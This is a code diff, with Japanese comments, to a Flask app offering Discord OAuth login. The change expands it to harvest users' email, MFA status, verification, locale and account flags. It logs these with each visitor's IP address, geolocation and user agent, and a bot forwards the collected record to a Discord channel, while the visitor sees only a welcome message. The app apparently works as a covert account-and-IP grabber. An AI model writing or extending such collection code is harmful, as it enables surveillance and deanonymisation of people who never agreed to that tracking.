@@ -35,7 +35,8 @@ def save_log(discord_id, data):
 
 @app.route("/")
 def index():
-    url = f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
+    # scopeにidentifyとemailを追加
+    url = f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email"
     return render_template("index.html", discord_auth_url=url)
 
 @app.route("/callback")
@@ -44,13 +45,14 @@ def callback():
     if not code:
         return "コードがありません", 400
 
+    # トークン取得時もscopeをidentify emailに変更
     token = requests.post("https://discord.com/api/oauth2/token", data={
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": "identify"
+        "scope": "identify email"
     }, headers={"Content-Type": "application/x-www-form-urlencoded"}).json()
 
     access_token = token.get("access_token")
@@ -65,9 +67,19 @@ def callback():
     geo = get_geo_info(ip)
     user_agent = request.headers.get("User-Agent", "不明")
 
+    # Discordのユーザープロフィールをほぼ全部入れる
     data = {
-        "username": f"{user['username']}#{user['discriminator']}",
-        "id": user["id"],
+        "username": user.get("username", ""),
+        "discriminator": user.get("discriminator", ""),
+        "id": user.get("id", ""),
+        "avatar": user.get("avatar"),
+        "locale": user.get("locale"),
+        "mfa_enabled": user.get("mfa_enabled"),
+        "verified": user.get("verified"),
+        "email": user.get("email", ""),
+        "flags": user.get("flags"),
+        "premium_type": user.get("premium_type"),
+        "public_flags": user.get("public_flags"),
         "ip": ip,
         "country": geo["country"],
         "region": geo["region"],
@@ -76,21 +88,27 @@ def callback():
 
     save_log(user["id"], data)
 
-    # Botが準備できている場合だけ送信
     try:
         bot.loop.create_task(bot.send_log(
             f"✅ 新しいアクセスログ:\n"
-            f"名前: {data['username']}\n"
+            f"名前: {data['username']}#{data['discriminator']}\n"
             f"ID: {data['id']}\n"
             f"IP: {ip}\n"
             f"国: {geo['country']}\n"
             f"地域: {geo['region']}\n"
-            f"UA: {user_agent}"
+            f"UA: {user_agent}\n"
+            f"メール: {data['email']}\n"
+            f"MFA: {data['mfa_enabled']}\n"
+            f"認証済み: {data['verified']}\n"
+            f"Locale: {data['locale']}\n"
+            f"Flags: {data['flags']}\n"
+            f"Premium: {data['premium_type']}\n"
+            f"Public Flags: {data['public_flags']}"
         ))
     except Exception as e:
         print("Botが準備できていません:", e)
 
-    return f"{data['username']} さん、ようこそ！"
+    return f"{data['username']}#{data['discriminator']} さん、ようこそ！"
 
 @app.route("/logs")
 def show_logs():
